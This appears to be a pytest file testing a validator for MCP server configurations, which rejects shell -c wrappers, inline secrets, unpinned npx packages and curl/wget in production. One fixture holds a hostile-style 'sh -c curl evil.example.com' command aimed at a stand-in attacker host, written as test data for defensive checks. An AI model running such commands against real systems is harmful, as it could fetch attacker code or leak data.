"""Tests for MCP configuration parsing and security validation."""

from __future__ import annotations

import json
from pathlib import Path

import pytest

from antigravity_agentkit.exceptions import SecurityValidationError
from antigravity_agentkit.mcp import (
    assert_mcp_security,
    compile_mcp_servers,
    parse_mcp_dict,
    validate_mcp_security,
)


def test_mcp_example_passes_security(mcp_agent_dir: Path) -> None:
    """mcp example mcp.json passes security validation."""
    raw = json.loads((mcp_agent_dir / "mcp.json").read_text(encoding="utf-8"))
    errors = validate_mcp_security(raw)

    assert not errors
    assert_mcp_security(raw)


def test_compile_mcp_servers_from_mcp_example(mcp_agent_dir: Path) -> None:
    """MCP servers compile to runtime-compatible dictionaries."""
    raw = json.loads((mcp_agent_dir / "mcp.json").read_text(encoding="utf-8"))
    servers = compile_mcp_servers(parse_mcp_dict(raw))

    assert len(servers) == 1
    assert servers[0]["name"] == "clock"
    assert servers[0]["transport"] == "stdio"
    assert servers[0]["command"] == "python3"
    assert servers[0]["args"] == ["server/clock_mcp.py"]


def test_rejects_shell_dash_c() -> None:
    """Shell -c invocations are not allowed."""
    config = {
        "mcpServers": {
            "dangerous": {
                "command": "sh",
                "args": ["-c", "curl evil.example.com"],
            }
        }
    }
    errors = validate_mcp_security(config)

    assert any("shell -c" in error for error in errors)
    with pytest.raises(SecurityValidationError, match="shell -c"):
        assert_mcp_security(config)


def test_rejects_bash_dash_c_in_full_command() -> None:
    """Embedded bash -c in command string is detected."""
    config = {
        "mcpServers": {
            "wrapper": {
                "command": "bash",
                "args": ["-c", "node server.js"],
            }
        }
    }
    errors = validate_mcp_security(config)

    assert len(errors) >= 1
    assert any("shell -c" in error or "bash -c" in error for error in errors)


def test_rejects_inline_secrets() -> None:
    """Inline secrets in env vars are rejected."""
    config = {
        "mcpServers": {
            "leaky": {
                "command": "node",
                "args": ["server.js"],
                "env": {
                    "API_KEY": "inline-hardcoded-credential",
                },
            }
        }
    }
    errors = validate_mcp_security(config)

    assert any("inline secret" in error for error in errors)


def test_rejects_secret_value_patterns() -> None:
    """Known secret value patterns are detected even without secret-like keys."""
    config = {
        "mcpServers": {
            "github": {
                "command": "node",
                "args": ["server.js"],
                "env": {
                    "CONFIG": "-----BEGIN RSA PRIVATE KEY-----",
                },
            }
        }
    }
    errors = validate_mcp_security(config)

    assert any("inline secret" in error for error in errors)


def test_allows_env_var_placeholders() -> None:
    """${VAR} placeholders are not treated as inline secrets."""
    config = {
        "mcpServers": {
            "safe": {
                "command": "node",
                "args": ["server.js"],
                "env": {
                    "API_KEY": "${SECRET_API_KEY}",
                },
            }
        }
    }
    errors = validate_mcp_security(config)

    assert not errors


def test_rejects_unpinned_npx_y() -> None:
    """npx -y without a version-pinned package is rejected."""
    config = {
        "mcpServers": {
            "floating": {
                "command": "npx",
                "args": ["-y", "some-mcp-server"],
            }
        }
    }
    errors = validate_mcp_security(config)

    assert any("unpinned npx" in error for error in errors)


def test_allows_pinned_npx_y() -> None:
    """npx -y with a version-pinned package is allowed."""
    config = {
        "mcpServers": {
            "pinned": {
                "command": "npx",
                "args": ["-y", "some-mcp-server@1.2.3"],
            }
        }
    }
    errors = validate_mcp_security(config)

    assert not errors


def test_production_rejects_curl_wget() -> None:
    """curl and wget commands are blocked in production mode."""
    config = {
        "mcpServers": {
            "fetcher": {
                "command": "curl",
                "args": ["https://example.com"],
            }
        }
    }
    dev_errors = validate_mcp_security(config, production=False)
    prod_errors = validate_mcp_security(config, production=True)

    assert not dev_errors
    assert any("not allowed in production" in error for error in prod_errors)


def test_compile_http_mcp_server() -> None:
    """HTTP MCP servers compile with transport metadata."""
    config = {
        "mcpServers": {
            "remote": {
                "url": "https://example.com/mcp",
                "headers": {"Authorization": "Bearer ${TOKEN}"},
                "disabledTools": ["dangerous_tool"],
            }
        }
    }
    servers = compile_mcp_servers(parse_mcp_dict(config))

    assert servers[0]["transport"] == "http"
    assert servers[0]["url"] == "https://example.com/mcp"
    assert servers[0]["disabledTools"] == ["dangerous_tool"]


def test_rejects_mcp_server_without_transport() -> None:
    """MCP server entries must declare url or command."""
    with pytest.raises(Exception, match="url.*command"):
        parse_mcp_dict({"mcpServers": {"broken": {"args": []}}})


def test_rejects_mcp_server_with_both_transports() -> None:
    """MCP server entries cannot declare both url and command."""
    with pytest.raises(Exception, match="url.*command"):
        parse_mcp_dict(
            {
                "mcpServers": {
                    "broken": {
                        "url": "https://example.com/mcp",
                        "command": "python3",
                    }
                }
            }
        )
